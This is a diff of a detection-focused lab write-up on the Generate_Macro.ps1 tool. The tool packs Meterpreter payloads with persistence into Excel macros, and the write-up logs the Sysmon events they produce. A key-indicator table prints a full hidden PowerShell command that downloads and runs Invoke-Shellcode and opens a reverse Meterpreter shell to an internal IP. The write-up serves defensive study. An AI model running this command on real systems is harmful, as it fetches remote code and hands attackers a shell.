@@ -1,30 +1,34 @@
 # Generate_Macro.ps1 
 
 ## Goal 
-This write-up will focus on capturing techniques and the raw events by leveraging Generate_Macro (Credit to @enigma0x3) for study purpose. Generate-Macro will pack the payload into office macro and produce a xls file. For the payload options, it offers 4 options which are:
+This write-up will focus on capturing techniques (Mainly focus on persistent) and the raw events by leveraging Generate_Macro (Credit to @enigma0x3) for study purpose. Generate-Macro will pack the payload into office macro and produce a xls file. For the payload options, it offers 4 options which are:
 
-1. Meterpreter Shell with Logon Persistence
-2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin)
-3. Meterpreter Shell with Alternate Data Stream Persistence
-4. Meterpreter Shell with Scheduled Task Persistence
+| Simulation # | Payload Option                                                                           |
+| ------------ | ---------------------------------------------------------------------------------------- |
+| 1            | Meterpreter Shell with Logon Persistence                                                 |
+| 2            | Meterpreter Shell with Powershell Profile Persistence (Requires user to be local admin). |
+| 3            | Meterpreter Shell with Alternate Data Stream Persistence                                 |
+| 4            | Meterpreter Shell with Scheduled Task Persistence                                        |
 
 Once the victim open the malicious xls, the vbs with callback payload will be created at C:\Users\Public\config.vbs (default path). And by modifying the registry to maintain the persistency.
 
 ## Caveat
-This write-up will only focus on techniques used by Generate_Macro, please bare me to exclude other techniques outside this tool. 
+This write-up will only focus on techniques used by Generate_Macro, please bare with me to exclude other techniques outside this tool. 
 
 ## Logging environment
 * Splunk with Sysmon TA 
+* Windows 10 Pro
 
 ## Technical Context
-### Case 1
+### Simulation 1 
 #### Payload Generation
 * Payload was generate with option #1. Meterpreter Shell with Logon Persistence
+
 #### Attack Begin
 1. User open the malicious excel file and autorun the macro  
 The behavior of a user openin an excel file is too generic. Nothing had captured for this write-up.
 
-2. Persistent by Modify registry(T1112)  
+2. Persistent by modifying registry(T1112)  
 This macro will first modify the registry to maintain the persistency.  
 
 ##### Raw Sysmon Event
@@ -68,19 +72,28 @@ This macro will first modify the registry to maintain the persistency.
 
 ##### Key Indicator
 
-| Field             | Value          | Comments |
-| ----------------- | -------------- | -------- |
-| EventID           | 1              |          |
-| process_exec      | powershell.exe |          |
-| process_id|5680||
-| parent_process_id | 9140           |          |
-|cmdline|"C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1')); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 192.168.254.44 -Lport 443 -Force||
+| Field             | Value                                                                                                                                                                                                                                                                                                                                                | Comments |
+| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- |
+| EventID           | 1                                                                                                                                                                                                                                                                                                                                                    |          |
+| process_exec      | powershell.exe                                                                                                                                                                                                                                                                                                                                       |          |
+| process_id        | 5680                                                                                                                                                                                                                                                                                                                                                 |          |
+| parent_process_id | 9140                                                                                                                                                                                                                                                                                                                                                 |          |
+| cmdline           | "C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1')); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 192.168.254.44 -Lport 443 -Force |          |
 
-## Reference
-<https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1>
+### Simulation 2 
+Unable to simulate the attack since the macro no longer be able to run as administrator permission
+
+### Simulation 3
+Coming Soon
+
+### Simulation 4
+Coming Soon
 
 ## Credit
 @enigma0x3 - Author of Generate_Macro.ps1
 
 ## Declaimer 
 !This is for study purpose only!
+
+## Other takeaways
+* The reason of using VBScript as a wrapper is to hide the DOS prompt when invoking any payload.
